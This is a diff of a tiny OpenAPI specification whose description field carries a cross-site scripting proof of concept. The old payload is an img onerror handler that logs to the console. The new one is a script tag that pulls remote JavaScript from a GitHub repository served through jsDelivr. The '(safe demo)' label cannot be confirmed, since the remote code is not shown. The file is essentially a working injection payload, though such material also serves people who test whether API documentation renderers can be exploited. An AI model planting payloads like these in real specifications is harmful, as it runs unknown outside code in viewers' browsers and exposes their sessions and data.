@@ -1,9 +1,9 @@
 {
   "openapi":"3.0.0",
   "info":{
-    "title":"PoC",
+    "title":"PoC (safe demo)",
     "version":"1.0.0",
-    "description":"<img src=\"https://nonexistent.invalid/x.png\" onerror=\"console.log('poc: img onerror')\">"
+    "description":"<script src=\"https://cdn.jsdelivr.net/gh/IYBmad/script-inject@main/poc.js\"></script>"
   },
-  "paths":{}
+  "paths": {}
 }
